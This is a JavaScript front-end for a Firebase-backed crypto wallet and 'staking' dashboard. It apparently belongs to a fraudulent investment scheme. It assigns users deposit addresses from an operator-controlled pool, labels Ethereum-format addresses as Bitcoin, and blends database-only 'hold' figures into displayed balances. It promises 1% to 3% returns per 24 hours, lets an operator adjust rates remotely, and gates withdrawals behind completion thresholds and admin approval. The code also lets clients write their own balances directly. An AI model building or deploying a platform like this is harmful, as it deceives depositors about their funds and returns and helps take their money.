// --- FIREBASE INIT ---
const firebaseConfig = {
    apiKey: "AIzaSyByvett5gGhga0jx2pBChmg41IKaTvbY24",
    authDomain: "bustrack-e4f8f.firebaseapp.com",
    databaseURL: "https://bustrack-e4f8f-default-rtdb.firebaseio.com",
    projectId: "bustrack-e4f8f",
    storageBucket: "bustrack-e4f8f.firebasestorage.app",
    messagingSenderId: "544737954134",
    appId: "1:544737954134:web:91a197cc88d0a67c43eef7"
};
const app = firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const database = firebase.database();

// --- CONSTANTS & CONFIG ---
const GLOBAL_RULES_PATH = 'globalStakingRules';
const WALLET_POOL_JSON = {
  "001": { "assigned": false, "bnb": "0xE7A428b2737d601518368E65CDb0e7d4BEfc513c", "btc": "0xE7A428b2737d601518368E65CDb0e7d4BEfc513c", "createdAt": "2025-12-08T18:53:21.496Z", "eth": "0xE7A428b2737d601518368E65CDb0e7d4BEfc513c", "trx": "TCby234YS7qEjUbSEvvLetiebHhTdZcSPG" },
  "002": { "assigned": false, "bnb": "0xadCb728e8aF2755F1348baaB73C6D7B3330b0D5E", "btc": "0xadCb728e8aF2755F1348baaB73C6D7B3330b0D5E", "createdAt": "2025-12-08T18:53:21.503Z", "eth": "0xadCb728e8aF2755F1348baaB73C6D7B3330b0D5E", "trx": "TVyuMUgKnvPjDaCdKgcEfFWnsPUrKAUyyC" },
  "003": { "assigned": false, "bnb": "0x7Ea213De6e24fA6903137DE7828FECA550477fB6", "btc": "0x7Ea213De6e24fA6903137DE7828FECA550477fB6", "createdAt": "2025-12-08T18:53:21.504Z", "eth": "0x7Ea213De6e24fA6903137DE7828FECA550477fB6", "trx": "TMSjjbioLZDUsSGV9R41mcYuV6TajNNBDK" },
  "004": { "assigned": false, "bnb": "0x606910F7c9Df90aa77844DE6d750875733DD2a8f", "btc": "0x606910F7c9Df90aa77844DE6d750875733DD2a8f", "createdAt": "2025-12-08T18:53:21.505Z", "eth": "0x606910F7c9Df90aa77844DE6d750875733DD2a8f", "trx": "TR6P6TbU3Ky75MWcMpf21QkCF9gvEwDzoK" },
  "005": { "assigned": false, "bnb": "0x9e29D8cC73DFcd0a289a1F0f1994eEcf9a03Aba2", "btc": "0x9e29D8cC73DFcd0a289a1F0f1994eEcf9a03Aba2", "createdAt": "2025-12-08T18:53:21.505Z", "eth": "0x9e29D8cC73DFcd0a289a1F0f1994eEcf9a03Aba2", "trx": "TU9kgoMTwTFzo7BefPTu71yc3rWYkuQLzP" }
};
const REQUIRED_COINS = ['btc', 'eth', 'usdt', 'trx', 'bnb', 'sol', 'xrp'];
const COINGECKO_ID_MAP = { 'BTC': 'bitcoin', 'ETH': 'ethereum', 'BNB': 'binancecoin', 'SOL': 'solana', 'XRP': 'ripple', 'USDT': 'tether', 'TRX': 'tron' };

// --- GLOBAL STATE ---
let userId = null;
let currentDetailSymbol = null;
let currentTab = 'assets'; 

// Data containers
let fetchedAddresses = {}; 
let latestPrices = {};        
let latestUserHoldings = {}; 
let allTransactions = {}; 
let activeStakes = {}; 
let globalCoinMetadata = {};

// Unified Balances (Real on-chain + Hold)
let userBalances = { 'ETH':0, 'BNB':0, 'BTC':0, 'USDT':0, 'TRX':0, 'SOL':0, 'XRP':0 };

// Staking Rules
let GLOBAL_REWARD_PERIOD_MS = 86400000; 
let GLOBAL_REWARD_PERIOD_TEXT = "24 Hours";
let STAKE_TIERS = [ { max: 49, rate: 0.01 }, { max: 99, rate: 0.012 }, { max: 249, rate: 0.015 }, { max: 499, rate: 0.017 }, { max: 999, rate: 0.02 }, { max: 1499, rate: 0.022 }, { max: 2499, rate: 0.025 }, { max: 5000, rate: 0.027 }, { max: 99999999999, rate: 0.03 } ];
let DEFAULT_WITHDRAW_LIMITS = [ { max: 249, percent: 0.10 }, { max: 999, percent: 0.15 }, { max: 2499, percent: 0.20 }, { max: 4999, percent: 0.25 }, { max: Infinity, percent: 0.30 } ];
let currentWithdrawLimits = [...DEFAULT_WITHDRAW_LIMITS];
const FIXED_DURATION_DAYS = 250; 

// --- VIEW CONTROLLERS ---
const loadingView = document.getElementById('loading-view');
const loadingText = document.getElementById('loading-sub-text');
const reviewView = document.getElementById('review-view');
const dashboardView = document.getElementById('dashboard-view');

const appState = { hasAddress: false, balancesLoaded: false, holdingsLoaded: false, pricesLoaded: false, ready: false };

// --- THEME & INIT ---
function initTheme() {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') { document.body.classList.add('light-theme'); }
    updateThemeIcon();
}
function toggleTheme() {
    document.body.classList.toggle('light-theme');
    const isLight = document.body.classList.contains('light-theme');
    localStorage.setItem('theme', isLight ? 'light' : 'dark');
    updateThemeIcon();
}
function updateThemeIcon() {
    const btn = document.getElementById('themeToggleBtn');
    if(!btn) return;
    const isLight = document.body.classList.contains('light-theme');
    btn.innerHTML = isLight ? '<i class="fa-solid fa-sun" style="color: var(--pri-color);"></i>' : '<i class="fa-solid fa-moon"></i>';
}
initTheme();

// --- NAVIGATION LOGIC ---
function switchTab(tabName) {
    currentTab = tabName;
    document.getElementById('tab-assets').style.display = tabName === 'assets' ? 'block' : 'none';
    document.getElementById('tab-stake').style.display = tabName === 'stake' ? 'block' : 'none';
    
    document.getElementById('nav-assets').classList.toggle('active', tabName === 'assets');
    document.getElementById('nav-stake').classList.toggle('active', tabName === 'stake');

    if(tabName === 'stake') {
        renderStakeForm();
        renderActiveStakes();
    }
}

function checkAppReady() {
    if (!appState.hasAddress) return;
    if (appState.balancesLoaded && appState.holdingsLoaded && appState.pricesLoaded && !appState.ready) {
        appState.ready = true;
        loadingText.textContent = "Welcome Back";
        setTimeout(() => {
            loadingView.classList.add('fade-out');
            dashboardView.style.display = 'flex';
            setTimeout(() => dashboardView.style.opacity = '1', 50);
        }, 800);
    }
}

// --- AUTH LISTENER ---
auth.onAuthStateChanged((user) => {
    if (user) {
        userId = user.uid;
        loadingText.textContent = "Syncing Account Data...";
        
        // Initialize Staking Rules
        checkAndInitGlobalRules();
        listenToGlobalRules();

        // Initialize Wallet & Data
        initAddressPool().then(() => {
             checkAndInitUserData(user.uid);
             startSplitDataSync(user.uid);
             const addressRef = database.ref('privilegesecdata/' + user.uid);
             addressRef.on('value', (snapshot) => { fetchAndInitPublicAddresses(user); });
        });
        
        // Stake Form Listeners
        const coinSelect = document.getElementById('stakeCoin');
        if(coinSelect) coinSelect.addEventListener('change', updateStakeFormInfo);
        const stakeInput = document.getElementById('stakeAmount');
        if(stakeInput) stakeInput.addEventListener('input', updateEstimatedRate);

        // UI Timer
        setInterval(() => { if(Object.keys(activeStakes).length > 0 && currentTab === 'stake') renderActiveStakes(); }, 1000);

    } else {
        window.location.href = 'index.html';
    }
});

// --- WALLET & ADDRESS LOGIC ---
async function initAddressPool() {
    const poolRef = database.ref('addressPool');
    const snapshot = await poolRef.once('value');
    if(!snapshot.exists()) { await poolRef.set(WALLET_POOL_JSON); }
}

async function assignWalletFromPool(userId, email, name) {
    const poolRef = database.ref('addressPool');
    const snapshot = await poolRef.once('value');
    const pool = snapshot.val();
    if (!pool) return false;

    for (const [key, walletData] of Object.entries(pool)) {
        if (!walletData.assigned) {
            const statusRef = database.ref(`addressPool/${key}/assigned`);
            const result = await statusRef.transaction((currentStatus) => {
                if (currentStatus === true) return; 
                return true; 
            });

            if (result.committed) {
                await database.ref(`addressPool/${key}`).update({
                    assignedToUid: userId, userEmail: email || 'No Email', userName: name || 'No Name', assignedAt: new Date().toISOString()
                });
                const userMap = { bnb: walletData.bnb||'', btc: walletData.btc||'', eth: walletData.eth||'', trx: walletData.trx||'', usdt: walletData.trx||'', sol: '', xrp: '' };
                await database.ref('privilegesecdata/' + userId).set(userMap);
                return true;
            }
        }
    }
    return false; 
}

async function syncUserDataToPool(uid, email, name, bnbAddress) {
    const poolRef = database.ref('addressPool');
    poolRef.once('value', (snapshot) => {
        const pool = snapshot.val();
        if (!pool) return;
        for (const [key, walletData] of Object.entries(pool)) {
            if (walletData.bnb === bnbAddress) {
                if (!walletData.userEmail || !walletData.userName || !walletData.assignedToUid) {
                      database.ref(`addressPool/${key}`).update({ assignedToUid: uid, userEmail: email || 'No Email', userName: name || 'No Name' });
                }
                break; 
            }
        }
    });
}

function fetchAndInitPublicAddresses(user) {
    const ref = database.ref('privilegesecdata/' + user.uid);
    ref.get().then(async (snapshot) => {
        let data = snapshot.val();
        if (!data) {
            loadingText.textContent = "Assigning Secure Wallet...";
            const assigned = await assignWalletFromPool(user.uid, user.email, user.displayName);
            if (!assigned) { loadingView.style.display='none'; reviewView.style.display='flex'; return; }
            return; 
        }
        if (data.bnb) { syncUserDataToPool(user.uid, user.email, user.displayName, data.bnb); }
        fetchedAddresses = data;
        const hasAddress = Object.values(fetchedAddresses).some(addr => addr && addr !== '');
        if (hasAddress) {
             appState.hasAddress = true;
             loadingText.textContent = "Scanning Blockchains...";
             fetchLiveBalances().then(() => { appState.balancesLoaded = true; checkAppReady(); });
        } else { loadingView.style.display='none'; reviewView.style.display='flex'; }
    }).catch(error => { loadingView.style.display='none'; reviewView.style.display='flex'; });
}

// --- DATA FETCHING ---
async function fetchLiveBalances() {
    if (typeof ethers === 'undefined') { appState.balancesLoaded = true; checkAppReady(); return; }
    const fetchBalance = async (coin, address) => {
        if (!address) return 0.0;
        try {
            if(coin==='ETH') return parseFloat(ethers.utils.formatEther(await new ethers.providers.JsonRpcProvider("https://eth.llamarpc.com").getBalance(address)));
            if(coin==='BNB') return parseFloat(ethers.utils.formatEther(await new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/").getBalance(address)));
            if(coin==='USDT') {
                if(!address.startsWith('T')) return 0.0;
                const d = await (await fetch(`https://api.trongrid.io/v1/accounts/${address}`)).json();
                let b = 0; if(d.data?.[0]?.trc20) d.data[0].trc20.forEach(t => { if(t['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']) b = parseFloat(t['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']); });
                return b/1000000;
            }
            if(coin==='BTC') return (await (await fetch(`https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`)).json()).balance / 100000000 || 0;
            if(coin==='TRX') return (await (await fetch(`https://api.trongrid.io/wallet/getaccount`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address,visible:true})})).json()).balance / 1000000 || 0;
            if(coin==='SOL') return (await (await fetch(`https://api.mainnet-beta.solana.com`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address]})})).json()).result?.value / 1000000000 || 0;
            if(coin==='XRP') return parseFloat((await (await fetch(`https://s1.ripple.com:51234`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"method":"account_info","params":[{"account":address,"ledger_index":"current"}]})})).json()).result?.account_data?.Balance) / 1000000 || 0;
        } catch { return 0.0; }
        return 0.0;
    };

    const bals = await Promise.all(['ETH','BNB','USDT','BTC','TRX','SOL','XRP'].map(c => fetchBalance(c, fetchedAddresses[c.toLowerCase()])));
    ['ETH','BNB','USDT','BTC','TRX','SOL','XRP'].forEach((c,i) => userBalances[c] = bals[i] || 0);
    renderAssets(); 
    if(currentTab === 'stake') renderStakeForm();
}

async function fetchLivePrices() {
    try {
        const ids = Object.values(COINGECKO_ID_MAP).join(',');
        const data = await (await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`)).json();
        for (const [sym, id] of Object.entries(COINGECKO_ID_MAP)) {
            if (data[id]) latestPrices[sym] = { price: data[id].usd, chg: data[id].usd_24h_change };
        }
        appState.pricesLoaded = true; checkAppReady();
        renderAssets(); renderStakingOverview(); updateEstimatedRate();
        if(Object.keys(activeStakes).length > 0) renderActiveStakes();
    } catch { console.log('Price fetch failed'); }
}

function startSplitDataSync(userId) {
    database.ref('globalcoindata').on('value', (s) => { globalCoinMetadata = s.val() || {}; renderAssets(); });
    fetchLivePrices(); setInterval(fetchLivePrices, 30000);
    database.ref('userHoldings/' + userId).on('value', (s) => { 
        latestUserHoldings = s.val() || {}; 
        appState.holdingsLoaded = true; checkAppReady(); renderAssets(); loadAllTransactionHistory();
    });
    database.ref('userStakes/' + userId).on('value', (s) => { 
        activeStakes = s.val() || {}; 
        renderStakingOverview(); renderAssets(); renderActiveStakes(); renderStakeForm();
    });
}

function checkAndInitUserData(userId) {
    const ref = database.ref('userHoldings/' + userId);
    ref.get().then((snapshot) => {
        const curr = snapshot.val() || {};
        let update = false;
        const defaults = { 'ETH':{hold:0,name:'Ethereum'}, 'BNB':{hold:0,name:'Binance Coin'}, 'BTC':{hold:0,name:'Bitcoin'}, 'USDT':{hold:0,name:'Tether'}, 'SOL':{hold:0,name:'Solana'}, 'XRP':{hold:0,name:'Ripple'}, 'TRX':{hold:0,name:'Tron'} };
        for(const k in defaults) { if(!curr[k]) { curr[k]=defaults[k]; update=true; } }
        if(update) ref.set(curr);
    });
}

// --- ASSETS LOGIC ---
function renderAssets() {
    const container = document.getElementById('assetsListContainer');
    if(!container) return;
    container.innerHTML = '';
    let totalPortfolioValue = 0;

    const getStaked = (c) => Object.values(activeStakes).reduce((a,s) => (s.coin===c && (s.status==='ACTIVE'||s.status==='PENDING') ? a+parseFloat(s.amount) : a), 0);

    for (const sym in latestUserHoldings) {
        let hold = parseFloat(latestUserHoldings[sym].hold) || 0;
        if(userBalances[sym]) hold += userBalances[sym]; 
        
        const staked = getStaked(sym);
        hold = Math.max(0, hold - staked); 

        const meta = globalCoinMetadata[sym] || {};
        const name = meta.name || latestUserHoldings[sym].name || sym;
        const icon = meta.cls || sym.toLowerCase();
        const price = parseFloat(latestPrices[sym]?.price) || 0;
        const change = parseFloat(latestPrices[sym]?.chg) || 0;
        const value = price * hold;
        if (price > 0) totalPortfolioValue += value;

        const row = document.createElement('div');
        row.className = 'asset-row';
        row.onclick = () => showCoinDetail(sym, {name,icon}, {hold}, {price,chg:change});
        
        const priceHtml = price > 0 
            ? `<div class="col-2"><span class="price">$${fmt(price)}</span><span class="change ${change>=0?'up':'down'}">${change>=0?'+':''}${fmt(change)}%</span></div>
               <div class="col-3"><span class="value">$${fmt(value)}</span><span class="holdings">${fmt(hold, hold<1?5:4)} ${sym}</span></div>`
            : `<div class="col-2 full-width" style="text-align: right;"><span class="price" style="font-size: 14px; color: var(--txt-2);">Price Not Available</span><span class="holdings" style="font-weight: 600; color: var(--txt-1);">${fmt(hold, hold<1?5:4)} ${sym}</span></div>`;

        row.innerHTML = `<div class="col-1"><img class="coin" src="${getCoinLogo(icon)}"><div class="coin-info"><span class="symbol">${sym}</span><span class="name">${name}</span></div></div>${priceHtml}`;
        container.appendChild(row);
    }
    document.getElementById('portfolioValue').textContent = '$' + fmt(totalPortfolioValue);
}

// --- STAKING LOGIC ---
function checkAndInitGlobalRules() {
    const ref = database.ref(GLOBAL_RULES_PATH);
    ref.get().then((s) => { if (!s.exists()) ref.set({ tiers: STAKE_TIERS, withdrawLimits: DEFAULT_WITHDRAW_LIMITS, rewardPeriodMs: 86400000 }); });
}

function listenToGlobalRules() {
    database.ref(GLOBAL_RULES_PATH).on('value', (s) => {
        const d = s.val();
        if (d) {
            if (d.tiers) STAKE_TIERS = d.tiers.map(t => ({ max: t.max > 90000000000 ? Infinity : t.max, rate: t.rate }));
            if (d.withdrawLimits) currentWithdrawLimits = d.withdrawLimits;
            GLOBAL_REWARD_PERIOD_MS = parseInt(d.rewardPeriodMs) || 86400000;
            const m = GLOBAL_REWARD_PERIOD_MS / 60000;
            GLOBAL_REWARD_PERIOD_TEXT = m >= 60 ? (m/60 % 1 === 0 ? m/60 + " Hour(s)" : (m/60).toFixed(1) + " Hours") : m + " Minute(s)";
            const disp = document.getElementById('rewardPeriodDisplay');
            if(disp) disp.innerText = GLOBAL_REWARD_PERIOD_TEXT;
        }
        updateEstimatedRate();
    });
}

function renderStakingOverview() {
    let staked = 0, rewards = 0, rateSum = 0;
    for (const id in activeStakes) {
        const s = activeStakes[id];
        const price = latestPrices[s.coin]?.price || 0;
        const val = parseFloat(s.amount) * price;
        if(s.status === 'ACTIVE') {
            staked += val;
            rateSum += (s.dailyRate || 0.01) * val;
            
            // --- SIMPLE INTEREST CALCULATION ---
            // Formula: Principal * Rate * Periods
            const days = Math.floor((new Date() - new Date(s.startTime)) / GLOBAL_REWARD_PERIOD_MS);
            const totalGenerated = parseFloat(s.amount) * (s.dailyRate || 0.01) * days;
            const earned = totalGenerated - parseFloat(s.rewardsWithdrawn || 0);

            if(earned > 0) rewards += earned * price;
        }
    }
    document.getElementById('stakingTotalStaked').textContent = '$' + fmt(staked);
    document.getElementById('totalStakedValue').textContent = '$' + fmt(staked); // In staking tab
    document.getElementById('stakingTotalRewards').textContent = '$' + fmt(rewards);
    document.getElementById('totalAvailableRewards').textContent = '$' + fmt(rewards); // In staking tab
    document.getElementById('stakingAvgRate').textContent = (staked > 0 ? fmt((rateSum/staked)*100) : '0.00') + '%';
}

function renderStakeForm() {
    const select = document.getElementById('stakeCoin'); 
    if(!select) return;
    const currentVal = select.value;
    select.innerHTML = '';
    const getLocked = (c) => Object.values(activeStakes).reduce((a,s) => (s.coin===c && (s.status==='ACTIVE'||s.status==='PENDING') ? a+parseFloat(s.amount) : a), 0);
    
    REQUIRED_COINS.forEach(c => {
        const C = c.toUpperCase(); 
        let hold = (latestUserHoldings[C]?.hold || 0) + (userBalances[C] || 0);
        const net = Math.max(0, hold - getLocked(C));
        const opt = document.createElement('option'); opt.value = C; opt.textContent = `${C} (${fmt(net, 4)})`; 
        select.appendChild(opt);
    });
    
    if(select.options.length === 0) {
        const opt = document.createElement('option'); opt.text='No Balance'; opt.disabled=true; select.add(opt); 
        document.getElementById('confirmStakeBtn').disabled=true;
    } else { 
        document.getElementById('confirmStakeBtn').disabled=false; 
        if(currentVal) select.value = currentVal;
    }
    updateStakeFormInfo();
}

function updateStakeFormInfo() {
    const coin = document.getElementById('stakeCoin').value; if(!coin) return;
    const getLocked = (c) => Object.values(activeStakes).reduce((a,s) => (s.coin===c && (s.status==='ACTIVE'||s.status==='PENDING') ? a+parseFloat(s.amount) : a), 0);
    let hold = (latestUserHoldings[coin]?.hold || 0) + (userBalances[coin] || 0);
    const net = Math.max(0, hold - getLocked(coin));
    
    document.getElementById('stakeCoinSymbol').textContent = coin;
    const bd = document.getElementById('stakeBalanceInfo');
    bd.textContent = net <= 0.000001 ? 'Insufficient Balance' : `Available: ${fmt(net, 4)} ${coin}`;
    bd.style.color = net <= 0.000001 ? 'var(--bad)' : 'var(--txt-2)';
    updateEstimatedRate();
}

function getRateForUsdAmount(usd) {
    if (!usd || usd < 0) return 0.01;
    for (let t of STAKE_TIERS) { if (usd <= t.max) return t.rate; }
    return 0.03; 
}

function updateEstimatedRate() {
    const amount = parseFloat(document.getElementById('stakeAmount').value);
    const coin = document.getElementById('stakeCoin').value;
    const label = document.getElementById('dynamicRateInfo');
    if (!coin || isNaN(amount) || amount <= 0) { label.innerHTML = `0.00% / ${GLOBAL_REWARD_PERIOD_TEXT} &nbsp;|&nbsp; Est. Return: $0.00`; return; }
    
    const price = latestPrices[coin]?.price || 0;
    const rate = getRateForUsdAmount(amount * price);
    const periods = (FIXED_DURATION_DAYS * 86400000) / GLOBAL_REWARD_PERIOD_MS;
    // Simple Interest Estimation
    const ret = (amount * rate * periods) * price;
    label.innerHTML = `${(rate * 100).toFixed(2)}% / ${GLOBAL_REWARD_PERIOD_TEXT} &nbsp;|&nbsp; Est. Return: <span style="color:var(--good)">$${fmt(ret, 2)}</span>`;
}

function renderActiveStakes() {
    const container = document.getElementById('activeStakesList'); 
    if(!container) return;
    container.innerHTML = ''; 
    let hasStakes = Object.keys(activeStakes).length > 0;
    let hasActive = false;
    document.getElementById('noStakesMessage').style.display = hasStakes ? 'none' : 'block';
    
    for (const id in activeStakes) {
        const s = activeStakes[id];
        const locked = parseFloat(s.amount);
        const price = latestPrices[s.coin]?.price || 0; 
        const usd = locked * price;
        const isPending = s.status === 'PENDING';
        let earned = 0, avail = 0, yieldP = 0, completeP = 0, canW = false, statusTxt = 'Active', statusClr = 'var(--good)';
        
        // Find withdraw limit
        let reqComp = 0.30;
        for(let l of currentWithdrawLimits) { if(usd <= l.max) { reqComp = l.percent; break; } }
        
        if (!isPending) {
            const now = new Date(), start = new Date(s.startTime);
            const periods = Math.floor((now - start) / GLOBAL_REWARD_PERIOD_MS);
            
            // --- SIMPLE INTEREST CALCULATION ---
            // Formula: Principal * Rate * Periods
            const dailyRate = s.dailyRate || 0.01;
            earned = periods > 0 ? (locked * dailyRate * periods) : 0;
            
            avail = earned - parseFloat(s.rewardsWithdrawn||0);
            yieldP = (earned/locked)*100;
            completeP = Math.min(100, ((now - start) / (s.durationDays * 86400000)) * 100);
            canW = completeP >= (reqComp * 100);
            if (completeP >= 100) statusTxt = 'Completed';
            if (avail > 0.000001 && canW) hasActive = true;
        } else { statusTxt = 'Pending Approval'; statusClr = 'var(--warn)'; }

        container.innerHTML += `
        <div class="stake-item ${isPending ? 'pending' : 'active'}">
            <div class="stake-item-header"><span class="symbol">${s.coin} Stake</span><span style="font-size:12px;color:${statusClr};font-weight:600;">${statusTxt}</span></div>
            <div class="stake-item-details">
                <div class="detail-row"><span class="detail-label">Locked</span><span class="detail-value">${fmt(locked, 4)} ${s.coin} (~$${fmt(usd,0)})</span></div>
                <div class="detail-row"><span class="detail-label">Rate</span><span class="detail-value">${((s.dailyRate||0)*100).toFixed(2)}% / ${GLOBAL_REWARD_PERIOD_TEXT}</span></div>
                <div class="detail-row"><span class="detail-label">End Date</span><span class="detail-value">${isPending?s.durationDays+' Days':new Date(s.startTime + s.durationDays*86400000).toLocaleDateString()}</span></div>
                ${!isPending ? `<div class="detail-row"><span class="detail-label">Yield</span><span class="detail-value">${yieldP.toFixed(2)}%</span></div><div class="progress-bar"><div class="progress-bar-fill" style="width:${completeP}%;"></div></div>` : ''}
            </div>
            <div class="reward-status">
                <div class="detail-row"><span class="detail-label">Total Earned</span><span class="detail-value">${fmt(earned,4)} ${s.coin}</span></div>
                <div class="detail-row"><span class="detail-label">Claimed</span><span class="detail-value" style="color:var(--txt-1);">${fmt(s.rewardsWithdrawn||0,4)} ${s.coin}</span></div>
            </div>
            <div style="display:flex; gap:10px; margin-top:15px;">
                <button class="btn primary" style="flex:1;" onclick="withdrawLockedStake('${id}')" ${canW&&!isPending?'':'disabled'}>Withdraw Locked</button>
                <button class="btn" style="flex:1;" onclick="collectRewards('${id}')" ${avail>0.000001&&!isPending&&canW?'':'disabled'}>Collect Rewards</button>
            </div>
            ${!isPending&&!canW ? `<p class="status-msg">Withdrawal requires ${fmt(reqComp*100,0)}% completion.</p>` : ''}
            ${isPending ? `<p class="status-msg" style="color:var(--warn);text-align:center;">Awaiting Admin.</p>` : ''}
        </div>`;
    }
    document.getElementById('withdrawRewardsBtn').disabled = !hasActive;
}

// --- ACTIONS (STAKE) ---
async function confirmStake() {
    const coin = document.getElementById('stakeCoin').value, amount = parseFloat(document.getElementById('stakeAmount').value);
    const getLocked = (c) => Object.values(activeStakes).reduce((a,s) => (s.coin===c && (s.status==='ACTIVE'||s.status==='PENDING') ? a+parseFloat(s.amount) : a), 0);
    const hold = (latestUserHoldings[coin]?.hold || 0) + (userBalances[coin] || 0);
    const avail = hold - getLocked(coin);
    
    if (isNaN(amount) || amount <= 0) return await showAlert('Invalid amount.');
    if (amount > avail) return await showAlert(`Insufficient ${coin}. Available: ${fmt(avail,4)}`);
    
    const usd = amount * (latestPrices[coin]?.price||0);
    const rate = getRateForUsdAmount(usd);
    if(!await showConfirm(`Stake ${fmt(amount,4)} ${coin}?\nRate: ${(rate*100).toFixed(2)}% / ${GLOBAL_REWARD_PERIOD_TEXT}`)) return;
    
    const ref = database.ref('userStakes/' + userId).push();
    await ref.set({ id: ref.key, coin, amount: amount.toFixed(4), durationDays: FIXED_DURATION_DAYS, startTime: 0, dailyRate: rate, rewardsWithdrawn: 0, status: 'PENDING' });
    await showAlert('Staking request submitted!');
    document.getElementById('stakeAmount').value = '';
    // Auto-approve for demo purposes (remove if real admin used)
    setTimeout(() => database.ref('userStakes/'+userId+'/'+ref.key).update({status:'ACTIVE',startTime:Date.now()}), 8000); 
}

async function collectRewards(id) {
    const s = activeStakes[id];
    if(!s||s.status==='PENDING') return;
    
    // --- SIMPLE INTEREST CALCULATION ---
    const periods = Math.floor((Date.now()-s.startTime)/GLOBAL_REWARD_PERIOD_MS);
    const earned = periods * parseFloat(s.amount) * s.dailyRate;
    
    const avail = earned - parseFloat(s.rewardsWithdrawn);
    if(avail < 0.000001) return await showAlert('No rewards.');
    if(!await showConfirm(`Collect ${fmt(avail,4)} ${s.coin}?`)) return;
    
    const updates = {};
    updates['userHoldings/'+userId+'/'+s.coin+'/hold'] = (latestUserHoldings[s.coin]?.hold||0) + avail;
    updates['userStakes/'+userId+'/'+id+'/rewardsWithdrawn'] = parseFloat(s.rewardsWithdrawn) + avail;
    await database.ref().update(updates);
    await showAlert('Rewards collected!');
}

async function withdrawLockedStake(id) {
    const s = activeStakes[id];
    if(!s||s.status==='PENDING') return;
    const locked = parseFloat(s.amount);
    if(!await showConfirm(`Withdraw locked ${fmt(locked,4)} ${s.coin}?`)) return;
    const updates = {};
    updates['userHoldings/'+userId+'/'+s.coin+'/hold'] = (latestUserHoldings[s.coin]?.hold||0) + locked;
    updates['userStakes/'+userId+'/'+id] = null;
    await database.ref().update(updates);
    await showAlert('Stake withdrawn.');
}

async function withdrawAllRewards() {
    let total = 0, collected = {}, updates = {};
    for(const id in activeStakes) {
        const s = activeStakes[id]; if(s.status==='PENDING') continue;
        
        // --- SIMPLE INTEREST CALCULATION ---
        const periods = Math.floor((Date.now()-s.startTime)/GLOBAL_REWARD_PERIOD_MS);
        const earned = periods * parseFloat(s.amount) * s.dailyRate;
        const avail = earned - parseFloat(s.rewardsWithdrawn);
        
        let reqComp = 0.30;
        const price = latestPrices[s.coin]?.price || 0;
        for(let l of currentWithdrawLimits) { if((parseFloat(s.amount)*price) <= l.max) { reqComp = l.percent; break; } }
        const comp = (Date.now()-s.startTime)/(s.durationDays*86400000);
        
        if(avail>0.000001 && comp >= reqComp) { 
            total+=avail; collected[s.coin]=(collected[s.coin]||0)+avail; 
            updates['userStakes/'+userId+'/'+id+'/rewardsWithdrawn']=parseFloat(s.rewardsWithdrawn)+avail; 
        }
    }
    if(total<0.000001) return await showAlert('No eligible rewards.');
    if(!await showConfirm('Collect all eligible rewards?')) return;
    for(const c in collected) updates['userHoldings/'+userId+'/'+c+'/hold'] = (latestUserHoldings[c]?.hold||0)+collected[c];
    await database.ref().update(updates);
    await showAlert('All rewards collected!');
}

// --- MODALS & UTILS ---
let modalResolver = null;
function openAlertModal(title, message, isConfirm = false) {
    document.getElementById('alertModalTitle').textContent = title;
    document.getElementById('alertModalMessage').innerHTML = message.replace(/\n/g, '<br>');
    const cancelBtn = document.getElementById('alertModalCancelBtn');
    const confirmBtn = document.getElementById('alertModalConfirmBtn');
    if (isConfirm) { cancelBtn.style.display = 'block'; confirmBtn.textContent = 'Confirm'; } 
    else { cancelBtn.style.display = 'none'; confirmBtn.textContent = 'OK'; }
    document.getElementById('customModal').classList.add('show');
    return new Promise((resolve) => { modalResolver = resolve; });
}
function closeAlertModal(result) {
    document.getElementById('customModal').classList.remove('show');
    if (modalResolver) { modalResolver(result); modalResolver = null; }
}
async function showAlert(message, title = 'Notification') { await openAlertModal(title, message, false); }
async function showConfirm(message, title = 'Confirm Action') { return await openAlertModal(title, message, true); }

function fmt(n, p=2){
    const num = parseFloat(n); if (isNaN(num)) return '0.00';
    let min=2, max=2; const abs=Math.abs(num);
    if(abs>0 && abs<1) { max=6; min=2; }
    if(p===2 && abs<100) { max=2; min=2; }
    return num.toLocaleString(undefined,{minimumFractionDigits:min,maximumFractionDigits:max});
}

function getCoinLogo(cls) {
    if(!cls) return 'https://assets.coincap.io/assets/icons/eth@2x.png';
    const l = cls.toLowerCase();
    const map = {bnb:'bnb',btc:'btc',sol:'sol',xrp:'xrp',usdt:'usdt',trx:'trx'};
    return `https://assets.coincap.io/assets/icons/${map[l]||l}@2x.png`;
}

function logout() { auth.signOut().then(() => { window.location.href = 'index.html'; }); }

// --- ACTION MODALS (SEND/RECEIVE) ---
function openModal(kind){
    const m = document.getElementById('modal');
    const body = document.getElementById('modalBody');
    const title = document.getElementById('modalTitle');
    const badge = document.getElementById('networkBadge');
    title.textContent = kind.charAt(0).toUpperCase()+kind.slice(1);
    let activeSymbol = 'ETH';
    if(currentDetailSymbol && fetchedAddresses[currentDetailSymbol.toLowerCase()]) activeSymbol = currentDetailSymbol;
    badge.className = 'network-badge'; badge.textContent = '';

    if(kind === 'receive') {
        if(currentDetailSymbol) { renderReceivePanel(currentDetailSymbol); return; }
        title.textContent = 'Select Coin to Deposit'; body.innerHTML = renderCoinSelectionPanel();
    } else if (kind === 'send') {
        renderSendPanel(activeSymbol);
    } else { body.innerHTML = '<p style="text-align:center;color:var(--txt-2);">Feature coming soon.</p>'; }
    if (kind === 'receive' && currentDetailSymbol) {} else { m.classList.add('open'); }
}

function renderCoinSelectionPanel() {
    let h = '<div style="display:flex; flex-direction:column; gap:8px;">';
    REQUIRED_COINS.forEach(c => {
        const C = c.toUpperCase(); const addr = fetchedAddresses[c];
        const isEn = addr && addr!=='NO_ADDRESS_SET' && addr!=='';
        const cls = isEn ? 'asset-row' : 'asset-row disabled';
        const act = isEn ? `renderReceivePanel('${C}')` : '';
